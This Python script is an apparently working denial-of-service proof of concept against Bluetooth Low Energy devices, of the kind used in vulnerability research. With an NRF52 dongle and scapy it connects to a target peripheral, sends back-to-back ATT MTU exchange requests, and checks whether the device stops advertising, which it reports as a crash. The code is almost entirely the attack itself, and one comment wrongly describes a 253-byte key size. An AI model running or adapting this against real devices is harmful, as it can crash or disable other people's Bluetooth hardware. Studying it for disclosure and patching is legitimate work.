#!/usr/bin/env python

import os
import platform
import sys
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
from scapy.utils import wrpcap
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
# timeout lib
from timeout_lib import start_timeout, disable_timeout, update_timeout
from discover import discover_attacker_dongle

# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Internal vars
none_count = 0
end_connection = False
connecting = False
slave_addr_type = 0
attack = True
# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
attacker_serial_port = discover_attacker_dongle()
if None in attacker_serial_port:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)
else:
    serial_port = attacker_serial_port[0]

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 2:
    advertiser_address = sys.argv[1].lower()
else:
    advertiser_address = 'c8:c9:a3:d3:65:1e'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.lower())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
          ' received\nThe device may have crashed!!!')
    disable_timeout('scan_timeout')


def scan_timeout():
    global connecting, slave_addr_type
    connecting = False
    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    start_timeout('scan_timeout', 2, scan_timeout)


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', 2, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while attack:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and not BTLE_EMPTY_PDU in pkt:
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) \
                and hasattr(pkt, 'AdvA') and pkt.AdvA == advertiser_address.lower() \
                and connecting is False:
            connecting = True
            update_timeout('scan_timeout')
            disable_timeout('crash_timeout')
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.lower() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            driver.send(conn_request)
        if BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)
        elif BTLE_EMPTY_PDU in pkt:
            update_timeout('scan_timeout')

        elif LL_VERSION_IND in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            # Here we send a key size with 253, which is way higher than the usual 16 bytes for the pairing procedure
            att_mtu_req = BTLE(
                access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(
                mtu=247)
            driver.send(att_mtu_req)  # Send mtu request 1 time
            driver.send(att_mtu_req)  # Send mtu request again (2 consecutive connection events)
            print(Fore.RED+ "Flooding attack, Multiple ATT_Exchange_MTU_Request packets were sent!!")
            if 'CONTINUE_ATTACK' in os.environ:
                attack = True
            else:
                attack = False
            sleep(1)
            # pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND()
            # driver.send(pkt)
            
            #driver.send(scan_req)  # Go back to advertisement channel (without sending LL_TERMINATE_IND)
            #wrpcap(os.path.basename(__file__).split('.')[0]+'.pcap', NORDIC_BLE(board=75, protocol=2, flags=0x1) / att_mtu_req)
            #print(Fore.RED + "PCAP saved")
            #attack = False  
            #driver.set_scanmode()
        elif ATT_Exchange_MTU_Response in pkt:
            terminate_conn = BTLE(access_addr=1) / \
                        BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND()
            driver.send(terminate_conn)
            end_connection = True
            
        elif end_connection == True:
            end_connection = False
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            print(Fore.YELLOW + 'Connection reset, malformed packet was sent')
            # Yes, we're sending raw link layer messages in Python. Don't tell Bluetooth SIG as this is forbidden!!!
            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)
            start_timeout('crash_timeout', 7, crash_timeout)  
            if 'CONTINUE_ATTACK' in os.environ:
                attack = True
            else:
                attack = False
            exit(0)
        

    sleep(0.01)
